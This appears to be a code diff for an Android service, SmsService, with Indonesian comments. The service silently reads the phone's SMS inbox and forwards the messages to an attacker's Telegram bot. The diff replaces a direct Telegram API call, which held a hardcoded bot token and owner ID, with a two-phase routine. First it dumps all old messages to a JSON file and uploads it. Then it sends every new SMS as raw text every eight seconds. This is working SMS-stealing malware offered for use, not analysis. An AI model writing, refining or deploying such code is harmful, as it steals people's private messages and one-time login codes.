@@ -16,26 +16,27 @@ import android.util.Log;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.nio.charset.StandardCharsets;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashSet;
+import java.util.Locale;
 import java.util.Set;
 
 public class SmsService extends Service {
 
     private static final String TAG = "SmsService";
     private static final long LOOP_MS = 8000L;
-
-    // ====== KONFIGURASI OWNER ======
-    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
-    private static final String OWNER_ID  = "8275632263";
-    // ==============================
+    private static final Uri SMS_URI = Uri.parse("content://sms/inbox");
 
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final Set<String> sentIds = new HashSet<>();
+    /** ID SMS yang SUDAH pernah diproses (lama maupun baru). */
+    private final Set<String> seenIds = new HashSet<>();
     private boolean running;
+    private boolean initialLoadDone;
+
     private final Runnable loop = new Runnable() {
         @Override public void run() {
             try { poll(); } catch (Exception e) { Log.w(TAG, "poll error", e); }
@@ -84,35 +85,106 @@ public class SmsService extends Service {
     }
 
     private void poll() {
-        JSONArray baru = SmsReader.readNewSms(this, sentIds);
-        if (baru.length() == 0) return;
-        String json = baru.toString();
-        SmsReader.writeJsonToDisk(this, json);
-        sendToTelegram(json);
+        // ---------- FASE 1: muat semua SMS LAMA sekali, kirim sebagai FILE ----------
+        if (!initialLoadDone) {
+            JSONArray all = readAllSms();
+            if (all.length() > 0) {
+                File file = writeJsonToDisk(all.toString());
+                if (file != null) {
+                    TelegramSender.sendDocument(file, "Log SMS lama (" + all.length() + " pesan)");
+                }
+            }
+            initialLoadDone = true;
+            return;
+        }
+
+        // ---------- FASE 2: SMS BARU langsung dikirim raw text ----------
+        JSONArray baru = readNewSmsOnly();
+        for (int i = 0; i < baru.length(); i++) {
+            try {
+                JSONObject o = baru.getJSONObject(i);
+                String from = o.optString("from", "-");
+                String body = o.optString("body", "");
+                String text = "📩 SMS BARU\n"
+                        + "Dari: " + from + "\n"
+                        + "Waktu: " + o.optLong("date") + "\n\n"
+                        + body;
+                TelegramSender.sendRawText(text);
+            } catch (Exception e) {
+                Log.w(TAG, "kirim raw gagal", e);
+            }
+        }
     }
 
-    private void sendToTelegram(String json) {
-        HttpURLConnection c = null;
+    // Baca SEMUA SMS, tandai semua sebagai seen (dipakai sekali di awal)
+    private JSONArray readAllSms() {
+        JSONArray arr = new JSONArray();
+        Cursor c = null;
         try {
-            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
-            c = (HttpURLConnection) url.openConnection();
-            c.setRequestMethod("POST");
-            c.setDoOutput(true);
-            c.setConnectTimeout(15000);
-            c.setReadTimeout(15000);
-            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
-            JSONObject body = new JSONObject();
-            body.put("chat_id", OWNER_ID);
-            body.put("text", json);
-            try (OutputStream os = c.getOutputStream()) {
-                os.write(body.toString().getBytes(StandardCharsets.UTF_8));
+            c = getContentResolver().query(SMS_URI,
+                    new String[]{"_id", "address", "body", "date"},
+                    null, null, "date ASC");
+            if (c == null) return arr;
+            while (c.moveToNext()) {
+                String id = c.getString(0);
+                if (id == null) continue;
+                seenIds.add(id);
+                arr.put(toJson(id, c.getString(1), c.getString(2), c.getLong(3)));
             }
-            int code = c.getResponseCode();
-            Log.i(TAG, "telegram response=" + code);
         } catch (Exception e) {
-            Log.w(TAG, "telegram gagal", e);
-        } finally {
-            if (c != null) c.disconnect();
+            Log.w(TAG, "baca all sms gagal", e);
+        } finally { if (c != null) c.close(); }
+        return arr;
+    }
+
+    // Hanya SMS yang BELUM ada di seenIds
+    private JSONArray readNewSmsOnly() {
+        JSONArray arr = new JSONArray();
+        Cursor c = null;
+        try {
+            c = getContentResolver().query(SMS_URI,
+                    new String[]{"_id", "address", "body", "date"},
+                    null, null, "date ASC");
+            if (c == null) return arr;
+            while (c.moveToNext()) {
+                String id = c.getString(0);
+                if (id == null || seenIds.contains(id)) continue;
+                seenIds.add(id);
+                arr.put(toJson(id, c.getString(1), c.getString(2), c.getLong(3)));
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "baca new sms gagal", e);
+        } finally { if (c != null) c.close(); }
+        return arr;
+    }
+
+    private JSONObject toJson(String id, String from, String body, long date) {
+        JSONObject o = new JSONObject();
+        try {
+            o.put("id", id);
+            o.put("from", from == null ? "" : from);
+            o.put("body", body == null ? "" : body);
+            o.put("date", date);
+        } catch (Exception ignored) { }
+        return o;
+    }
+
+    private File writeJsonToDisk(String json) {
+        try {
+            File dir = getExternalFilesDir(null);
+            if (dir == null) dir = getFilesDir();
+            if (!dir.exists()) dir.mkdirs();
+            String name = "sms_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
+                    .format(new Date()) + ".json";
+            File out = new File(dir, name);
+            try (FileOutputStream fos = new FileOutputStream(out)) {
+                fos.write(json.getBytes(StandardCharsets.UTF_8));
+            }
+            Log.i(TAG, "file JSON: " + out.getAbsolutePath());
+            return out;
+        } catch (Exception e) {
+            Log.w(TAG, "tulis json gagal", e);
+            return null;
         }
     }
 }
